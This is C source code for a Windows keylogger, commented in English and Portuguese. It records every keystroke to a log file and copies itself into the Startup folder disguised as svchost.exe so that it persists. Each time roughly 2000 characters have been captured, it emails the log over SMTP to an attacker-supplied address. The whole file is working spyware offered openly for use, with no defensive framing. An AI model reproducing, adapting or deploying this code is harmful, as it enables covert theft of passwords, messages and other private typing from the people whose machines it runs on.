/*

	Keylogger that sends email after capturing some keys
	Keylogger que envia por email após capturar determinada qtd de teclas

*/

#define _WIN32_WINNT 0x0500
#include<windows.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

// Email sender defines:
#define GMAIL_SERVER "gmail-smtp-in.l.google.com"
#define EMAIL_FROM "keylogger@gmail.com"
#define EMAIL_TO "<your-email>"

//email lenght
#define BUFFER_SIZE 2000 

#define LOG_PATH "\\log.txt"
#define SENDER_SLEEP_TIME 100

//email sending flag
//var que auxilia na verificacao do envio do email
int success = 0;

//vet auxiliar
char *vet[] = {")", "!", "@", "#", "$", "%", "6", "&", "*", "("};

//startup add flag
//var que permite adicionar na startup apenas 1 vez
int k = 0;

void getKeys(FILE *f);
void sendData(SOCKET sock, char data[]);
void sendEmail(char server[], char from[], char to[], char buffer[]);
void addStartup(char * command);

int main(int argc, char** argv)
{
	//hiddens cmd	
	//oculta prompt de comando
	//ShowWindow (GetConsoleWindow(), SW_HIDE);

	//add keylogger to startup	
	//tenta add o keylogger na startup (toda vez que for executado)
	if (k == 0)
	{
		char command[] = "copy \"";

		strcat(command, argv[0]);
		strcat(command, "\" %AppData%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\svchost.exe");

		system(command);
		k = 1;
	}

	//opens the keylogger's log file	
	//abre arquivo de log do keylogger
	FILE *file = fopen(LOG_PATH, "r+");

	/*
		verifica se há resquicios de log no arquivo antes de criar outro
		util qnd o individuo desligou o pc durante a captura, ao reinicar o programa,
		os logs nao serao perdidos
	*/
	if (file != NULL)
	{
		int len;

		//go to the file end
		//vai pro final do arquivo
		fseek(file, 0, SEEK_END);

		//get the file lenght
		// pega quantidade de caracteres do arquivo (tamanho)
		len = ftell(file);

		printf("%d\n", len);
		
		//get the log file content and send it
		//pega todo o conteudo do arq e envia por email
		char *data = (char *)malloc(len);

		//go to the file start
		//vai pro inicio do arquivo e o lê inteiro
		fseek(file, 0, SEEK_SET);
		fread(data, sizeof(char), len, file);

		printf("%s\n", data);

		// loop for the successful email sending 
		// loop so sai quando o email é enviado corretamente
		while (success == 0)
		{
			sendEmail(GMAIL_SERVER, EMAIL_FROM, EMAIL_TO, data);
			if (success == 0)
			{
				//waits 60s
				//espera 60s
				Sleep(60000);
			}
		}

		success = 0;

		free(data);
	}

	//program's main loop
	//loop principal da aplicação 
	while (1)
	{
		//opens a new log file
		//abre novo arquivo de log
		FILE *f = fopen(LOG_PATH, "w+");

		if (f == NULL)
		{
			perror("error when trying to create log file");
		}

		//calls the function responsable for the keylogging
		//chama funcao que realiza o keylogging ate pegar determinada qtd de keys
		getKeys(f);

		fclose(f);
	}

	return 0;
}

void getKeys(FILE *f)
{

	int i, c; // variaveis de loop
	int len, pos; // auxiliares    
	int caps = 0; // funcionalidade do capslock

	while (1)
	{
		
		//avoids overcharging the system
		//para nao sobrecarregar o sistema
		Sleep(10); 

		//loop responsible for the keylogging
		//loop que fica responsavel por todo o keylogging
		for (i = 0; i < 255; i++)
		{
			//identifies an 'i' key pressed
			//verifica se a tecla i (ASCII) foi pressionada
			if (GetAsyncKeyState(i) == -32767)
			{
				printf("\n%d\t%c\n", i, i);

				switch(i)
				{
	
				case 37: //left
					fprintf(f, "");
					break;	
				case 38: //up
					fprintf(f, "");
					break;
				case 39: //right
					fprintf(f, "");	
					break;	
				case 40: //down
					fprintf(f, "");
					break;					
				
				case 219: //acento
					fprintf(f, "[accent]");
					break;
				case 16:
					fprintf(f, "");
					break;
				//mouse1
				case 0x01:
					fprintf(f, "");
					break;
				//mouse2
				case 0x02:
					fprintf(f, "");
					break;
				case 8:
					fprintf(f, " [BS] ");
					break;
				case 9:
					fprintf(f, " [TAB] ");
					break;
				case 13:
					fprintf(f, "\n");
					break;
				case 18:
					fprintf(f, " [ALT] ");
					break;
				case 160:
				{
					//[LSHIFT]

					do
					{
						Sleep(10);
						pos = -1;
						for (c = 0; c < 255; c++)
						{
							if (GetAsyncKeyState(c) == -32767)
							{
								printf("\n%d\t%c\n", c, c);

								// symbols !@#$%¨&*()
								// captura sinas de pontuação !@#$%¨&*()
								if (c >= 48 && c <= 57)
								{
									pos = c % 48;
									printf("%s\n", vet[pos]);
									fprintf(f, vet[pos]);
									break;
								}
								else
								{

									switch(c)
									{
									case 16:
										fprintf(f, "");
										break;
									case 160:
										fprintf(f, " [LSHIFT] ");
										break;
									case 191:
										fprintf(f, ":");
										break;
									case 226:
										fprintf(f, "|");
										break;
									case 193:
										fprintf(f, "?");
										break;
									case 189:
										fprintf(f, "_");
										break;
									case 187:
										fprintf(f, "+");
										break;
									case 192:
										fprintf(f, "\"");
										break;
									case 220:
										fprintf(f, "}");
										break;
									case 221:
										fprintf(f, "{");
										break;
									case 188:
										fprintf(f, "<");
										break;
									case 190:
										fprintf(f, ">");
										break;
										//Ç
									case 186:
										fprintf(f, "C");
										break;
									default:
										putc(c, f);
									}

									pos = 1;
								}
							}
						}
					}
					while (pos == -1);
					break;
				}
				case 161:
				{
					//[RSHIFT]

					do
					{
						Sleep(10);
						pos = -1;

						for (c = 0; c < 255; c++)
						{
							if (GetAsyncKeyState(c) == -32767)
							{
								printf("\n%d\t%c\n", c, c);

								//symbols !@#$%¨&*()
								// captura sinas de pontuação !@#$%¨&*()
								if (c >= 48 && c <= 57)
								{
									pos = c % 48;
									printf("%s\n", vet[pos]);
									fprintf(f, vet[pos]);
									break;
								}
								else
								{

									switch(c)
									{
									case 16:
										fprintf(f, "");
										break;
									case 161:
										fprintf(f, " [RSHIFT] ");
										break;
									case 191:
										fprintf(f, ":");
										break;
									case 226:
										fprintf(f, "|");
										break;
									case 193:
										fprintf(f, "?");
										break;
									case 189:
										fprintf(f, "_");
										break;
									case 187:
										fprintf(f, "+");
										break;
									case 192:
										fprintf(f, "\"");
										break;
									case 220:
										fprintf(f, "}");
										break;
									case 221:
										fprintf(f, "{");
										break;
									case 188:
										fprintf(f, "<");
										break;
									case 190:
										fprintf(f, ">");
										break;
										//Ç
									case 186:
										fprintf(f, "C");
										break;
									default:
										putc(c, f);
									}
									
									//just to break the loop
									//so pra sair do-while loop
									pos = 1;
								}
							}
						}
					}
					while (pos == -1);
					break;
				}
				case 20:
				{
					fprintf(f, "");
					caps = (caps == 0 ? 1 : 0);
					break;
				}
				case 32:
					fprintf(f, " ");
					break;
				case 190:
					fprintf(f, ".");
					break;
				case 162:
					fprintf(f, " [LCONTROL] ");
					break;
				case 163:
					fprintf(f, " [RCONTROL] ");
					break;
				case 187:
					fprintf(f, "=");
					break;
				case 188:
					fprintf(f, ",");
					break;
				case 189:
					fprintf(f, "-");
					break;
				case 193:
					fprintf(f, "/");
					break;
				case 191:
					fprintf(f, ";");
					break;
				case 226:
					fprintf(f, "\\");
					break;
				case 192:
					fprintf(f, "'");
					break;
				case 220:
					fprintf(f, "]");
					break;
				case 221:
					fprintf(f, "[");
					break;

					//numpad
				case 96:
					fprintf(f, "0");
					break;
				case 97:
					fprintf(f, "1");
					break;
				case 98:
					fprintf(f, "2");
					break;
				case 99:
					fprintf(f, "3");
					break;
				case 100:
					fprintf(f, "4");
					break;
				case 101:
					fprintf(f, "5");
					break;
				case 102:
					fprintf(f, "6");
					break;
				case 103:
					fprintf(f, "7");
					break;
				case 104:
					fprintf(f, "8");
					break;
				case 105:
					fprintf(f, "9");
					break;
					//ç
				case 186:
					fprintf(f, "c");
					break;

				default:
					if (caps == 0)
					{
						putc(tolower(i), f);
					}
					else
					{
						putc(VkKeyScan(i), f);
					}
				}

				//get the file lenght
				//pega qtd de caracteres do arquivo (tamanho)
				len = ftell(f);

				printf("%d\n", len);
				
				//saves the log file
				//fecha e abre arquivo p/ salvar
				fclose(f);
				FILE *f = fopen(LOG_PATH, "a+");

				//verifies if the log size is >= buffer_size 
				//verifica se ja capturou teclas o suficiente p/ enviar
				if (len >= BUFFER_SIZE)
				{	
					//get the log file content and sends it
					//pega todo o conteudo do arq e envia por email
					char *data = (char *)malloc(len);

					//vai pro inicio do arquivo e lê tudo
					fseek(f, 0, SEEK_SET);
					fread(data, sizeof(char), len, f);

					fclose(f);

					printf("%s\n", data);

					// loop for the successful email sending
					// loop so sai quando o email é enviado corretamente
					while (success == 0)
					{
						sendEmail(GMAIL_SERVER, EMAIL_FROM, EMAIL_TO, data);
						if (success == 0)
						{
							//waits 60s
							//espera 60s
							Sleep(60000);
						}
					}

					success = 0;

					free(data);

					return;
				}

			}
		}

	}

}


/*

	Credits for these two functions -> https://www.youtube.com/watch?v=-MSr6CO-ek4&t=168s

*/

void sendData(SOCKET sock, char data[])
{
	//verifies if the sending was successful
	//tenta e verifica se o conteudo foi enviado corretamente
	if (send(sock, data, strlen(data), 0) == SOCKET_ERROR)
	{
		perror("error sending email");
		return;
	}

	//waits for the sending
	//aguarda tempo para processar o envio
	Sleep(SENDER_SLEEP_TIME);

	success = 1;
}

void sendEmail(char server[], char from[], char to[], char buffer[])
{

	SOCKET sock;
	WSADATA wsaData;
	struct hostent *host;

	//Structure for handling internet addresses
	struct sockaddr_in dest;

	printf("%\nlen = %d\n", strlen(buffer));

	//lenght of the email content
	//tamanho do conteudo que será enviado por email
	char data[strlen(buffer) + 200];

	// Get socket and dest:

	// WSAStartup function initiates use of the Winsock DLL by a process
	WSAStartup(0x202, &wsaData);

	//The gethostbyname() function returns a structure of type hostent for the given host name.
	// struct hostent -> contem informacoes sobre o host (tipo IP)
	host = gethostbyname(server);

	if (host == NULL)
	{
		//The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll)
		WSACleanup();
		perror("'host = NULL'");
		return;
	}

	//set block of memory (&dest) full of zeros
	memset(&dest, 0, sizeof(dest));

	//copy the block of memory 'host.h_addr' to 'dest.sin_addr'
	//void * memcpy ( void * destination, const void * source, size_t num );
	memcpy(&(dest.sin_addr), host->h_addr, host->h_length);

	//more information about the host for the sockaddr_in structure
	dest.sin_family = host->h_addrtype;
	dest.sin_port = htons(25);

	//makes a socket
	//inicia um socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock == INVALID_SOCKET)
	{
		WSACleanup();
		perror("error initializing socket");
		return;
	}

	// Connect:
	//The connect() function shall attempt to make a connection on a socket
	//verifica se a conexao foi realizada corretamente
	if (connect(sock, (struct sockaddr *) &dest, sizeof(dest)) == -1)
	{
		closesocket(sock);
		WSACleanup();
		perror("connection error");
		return;
	}
	Sleep(SENDER_SLEEP_TIME);

	// Send data packets, like:
	// HELO ip.test.com
	// MAIL FROM: <from@gmail.com>
	// RCPT TO: <to@gmail.com>
	// DATA
	// TO: from@gmail.com
	// FROM: to@gmail.com
	// SUBJECT: Keylogger
	// this is a test email from keylogger
	// bla bla bla...
	// .

	sprintf(data, "HELO me.somepalace.com\n");
	sendData(sock, data);

	sprintf(data, "MAIL FROM: <%s>\n", from);
	sendData(sock, data);

	sprintf(data, "RCPT TO: <%s>\n", to);
	sendData(sock, data);

	sprintf(data, "DATA\n");
	sendData(sock, data);

	sprintf(data, "TO: %s\nFROM: %s\nSUBJECT: Keylogger\n%s\r\n.\r\n", to, from, buffer);

	sendData(sock, data);

	sprintf(data, "QUIT\n");
	sendData(sock, data);

	//printf("\nAll packets have been sended!");
	//Sleep(1);
	//system("cls");
	//printf("\n\n\n");

	// Close socket and cleanup WSA:
	closesocket(sock);
	WSACleanup();
}


